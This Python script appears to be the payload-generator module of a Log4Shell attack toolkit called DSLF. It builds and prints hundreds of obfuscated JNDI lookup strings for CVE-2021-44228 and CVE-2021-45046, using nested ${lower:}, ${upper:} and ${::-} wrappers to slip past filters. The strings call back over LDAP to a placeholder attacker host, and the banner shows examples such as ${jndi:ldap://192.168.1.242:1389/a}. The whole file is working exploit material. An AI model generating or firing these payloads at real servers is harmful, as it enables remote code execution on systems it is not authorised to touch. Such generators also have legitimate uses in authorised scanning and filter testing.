#!/usr/bin/env python3
import time
from termcolor import cprint

combinations = ["key", "${::-key}", "${lower:key}", "${upper:key}"]
tailer_cve_2021_44228 = '://{{EVIL}}:{{PORT}}/a}'
tailer_cve_2021_45046 = '://127.0.0.1#{{EVIL}}:{{PORT}}/a}'

def generate_payloads():

  jndi = []
  for i in combinations:
    txt_i = ''
    txt_i = i.replace('key', 'j')

    for j in combinations:
      txt_j = txt_i + j.replace('key', 'n')

      for k in combinations:
        txt_k = txt_j + k.replace('key', 'd')

        for l in combinations:
          txt_l = txt_k + l.replace('key', 'i')
          jndi.append('${' + txt_l + ':')
          txt_l = ''
      txt_k = ''
    txt_j = ''
  protocol = []
  

  for i in combinations:
    txt_i = ''
    txt_i = i.replace('key', 'l')

    for j in combinations:
      txt_j = txt_i + j.replace('key', 'd')

      for k in combinations:
        txt_k = txt_j + k.replace('key', 'a')

        for l in combinations:
          txt_l = txt_k + l.replace('key', 'p')
          protocol.append(txt_l + tailer_cve_2021_44228)
          protocol.append(txt_l + tailer_cve_2021_45046)
          txt_l = ''
      txt_k = ''
    txt_j = ''

  """  
  for i in combinations:
    txt_i = ''
    txt_i = i.replace('key', 'h')

    for j in combinations:
      txt_j = txt_i + j.replace('key', 't')

      for k in combinations:
        txt_k = txt_j + k.replace('key', 't')

        for l in combinations:
          txt_l = txt_k + l.replace('key', 'p')
          protocol.append(txt_l + tailer_cve_2021_44228)
          protocol.append(txt_l + tailer_cve_2021_45046)
          txt_l = ''
      txt_k = ''
    txt_j = ''
  
  for i in combinations:
    txt_i = ''
    txt_i = i.replace('key', 'd')

    for j in combinations:
      txt_j = txt_i + j.replace('key', 'n')

      for k in combinations:
        txt_k = txt_j + k.replace('key', 's')
        protocol.append(txt_k + tailer_cve_2021_44228)
        protocol.append(txt_k + tailer_cve_2021_45046)
      txt_k = ''
    txt_j = ''
  """

  for j in jndi:
   for p in protocol:
    cprint(j + p, 'cyan')


def main():
  print('')
  cprint('[•] DSLF - (D)arth (S)ide of the (L)og4j (F)orce', 'green', attrs=['bold'])
  cprint('[•] Author: Julien GARAVET', 'green')
  cprint('[•] + Passive Callback Module aka PCM', 'green')
  cprint('[•] + Active  Callback Module aka ACM', 'green')
  cprint('[•] + Active  Scanner  Module aka ASM', 'green')
  cprint('[•] + Payload Generator Module aka `PGM`', 'green')
  print('')
  cprint('[*] PGM - Payload Generator Module - Intels', 'green', attrs=['bold'])
  cprint('[*] CVE-2021-44228 with payload similar to ${jndi:ldap://192.168.1.242:1389/a}', 'green')
  cprint('[*] CVE-2021-45046 with payload similar to ${jndi:ldap://127.0.0.1#192.168.1.242:1389/a}', 'green')
  time.sleep(4)
  print('')
  cprint('[!] PGM - Payload Generator Module - Starting', 'cyan', attrs=['bold'])
  time.sleep(2)

  payloads = generate_payloads()


if __name__ == "__main__":
  main()
